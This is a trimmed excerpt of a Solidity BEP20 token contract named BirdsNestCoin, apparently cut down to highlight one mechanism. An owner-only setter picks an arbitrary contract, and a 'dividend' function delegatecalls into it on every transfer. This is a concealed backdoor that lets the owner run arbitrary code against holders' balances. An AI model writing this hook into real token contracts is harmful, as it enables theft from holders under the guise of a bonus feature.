...
contract BirdsNestCoin is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'BirdsNestCoin';
  ...
  */
  ...
  function claimDividendBNC(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C_BNC.delegatecall(
  ...
  function SetBonusBNC(address c) public onlyOwner {
    C_BNC = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendBNC(sender, recipient, amount);   
